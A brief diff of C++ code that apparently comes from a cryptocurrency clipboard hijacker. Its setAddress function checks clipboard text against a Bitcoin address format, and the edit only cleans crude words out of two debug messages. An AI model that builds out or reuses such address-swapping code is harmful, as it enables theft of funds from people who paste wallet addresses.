@@ -50,12 +50,12 @@ void setAddress(char* data, const size_t len, const char* address, string startC
 				CloseClipboard();
 			}
 			else {
-				cout << ">PENIS LEN MATCHES BUT NOT BTC ADDRESS" << endl;
+				cout << ">LEN MATCHES BUT NOT BTC ADDRESS" << endl;
 				throw(cLen);
 			}
 		}
 		else {
-			cout << ">NOTHING MATCHES UNLUKY PENIS" << endl;
+			cout << ">NOTHING MATCHES" << endl;
 			throw(cLen);
 		}
 	}
